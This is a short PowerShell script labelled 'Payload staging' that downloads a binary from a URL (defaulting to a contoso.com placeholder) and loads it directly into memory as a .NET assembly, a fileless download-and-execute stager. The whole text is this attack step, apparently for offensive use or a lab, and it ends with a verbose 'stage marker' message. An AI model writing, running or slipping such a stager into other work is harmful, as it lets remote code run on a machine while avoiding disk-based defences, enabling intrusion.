
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://contoso.com/payload.bin"
)
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($Stage1Url)
[Reflection.Assembly]::Load($AssemblyBytes)
Write-Verbose "stage marker 44 reached"
